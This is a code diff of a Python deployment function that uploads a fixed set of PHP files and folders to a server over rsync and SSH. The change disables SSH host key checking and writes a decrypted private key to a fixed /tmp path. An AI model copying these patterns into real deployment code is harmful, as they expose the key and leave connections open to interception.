@@ -738,34 +738,46 @@ def deploy_project_with_progress(server, password, domain, is_wildcard, deployme
         allowed_items = ['admin', 'page', 'qr', 'b64.php', 'config.php', 'fake.php', 'index.php']
         print(f"  Allowed items: {allowed_items}")
 
-        # Use rsync for faster file transfer
-        rsync_command = [
-            'rsync',
-            '-avz',  # Archive, verbose, compress
-            '--progress',
-            '--exclude', '.git', '--exclude', '__pycache__', '--exclude', '.cache', '--exclude', 'node_modules', # Exclude common directories
-            '--include', 'admin/', '--include', 'page/', '--include', 'qr/', '--include', 'b64.php', '--include', 'config.php', '--include', 'fake.php', '--include', 'index.php', # Include specific items
-            '--include', '*/', # Include directories
-            '--exclude', '*',  # Exclude everything else
-            f'{workspace_root}/',
-            f'{server.ssh_user}@{server.ip_address}:{server.ssh_port}/var/www/{domain}/'
-        ]
-
-        # Construct the rsync command with SSH options for port and identity file (if applicable)
-        ssh_options = []
+        # Construct SSH options
+        ssh_cmd_parts = ['ssh']
         if server.ssh_port != 22:
-            ssh_options.extend(['-e', f'ssh -p {server.ssh_port}'])
+            ssh_cmd_parts.extend(['-p', str(server.ssh_port)])
         
         # Add key-based authentication if ssh_key is available
+        temp_key_path = None
         if server.ssh_key:
             # Save the decrypted key to a temporary file
             temp_key_path = "/tmp/vps_manager_ssh_key"
             with open(temp_key_path, "w") as key_file:
                 key_file.write(decrypt_password_safe(server.ssh_key))
             os.chmod(temp_key_path, 0o600) # Set permissions
-            ssh_options.extend(['-e', f'ssh -p {server.ssh_port} -i {temp_key_path}'])
-
-        rsync_command[1:1] = ssh_options # Insert SSH options into the command list
+            ssh_cmd_parts.extend(['-i', temp_key_path])
+        
+        # Disable strict host key checking to avoid interactive prompt
+        ssh_cmd_parts.extend(['-o', 'StrictHostKeyChecking=no'])
+        
+        # Use rsync for faster file transfer
+        rsync_command = [
+            'rsync',
+            '-avz',  # Archive, verbose, compress
+            '--progress',
+            '-e', ' '.join(ssh_cmd_parts),  # SSH command with port and options
+            '--exclude', '.git',
+            '--exclude', '__pycache__',
+            '--exclude', '.cache',
+            '--exclude', 'node_modules',
+            '--include', 'admin/',
+            '--include', 'page/',
+            '--include', 'qr/',
+            '--include', 'b64.php',
+            '--include', 'config.php',
+            '--include', 'fake.php',
+            '--include', 'index.php',
+            '--include', '*/',  # Include directories
+            '--exclude', '*',  # Exclude everything else
+            f'{workspace_root}/',
+            f'{server.ssh_user}@{server.ip_address}:/var/www/{domain}/'
+        ]
 
         try:
             print(f"Running rsync command: {' '.join(rsync_command)}")
@@ -788,13 +800,13 @@ def deploy_project_with_progress(server, password, domain, is_wildcard, deployme
             print(f"[SUCCESS] Files uploaded via rsync")
             
             # Clean up temporary key file if used
-            if server.ssh_key:
+            if temp_key_path and os.path.exists(temp_key_path):
                 os.remove(temp_key_path)
 
         except Exception as e:
             print(f"Error during rsync upload: {e}")
-            if server.ssh_key and 'temp_key_path' in locals() and os.path.exists(temp_key_path):
-                 os.remove(temp_key_path)
+            if temp_key_path and os.path.exists(temp_key_path):
+                os.remove(temp_key_path)
             raise e
 
 
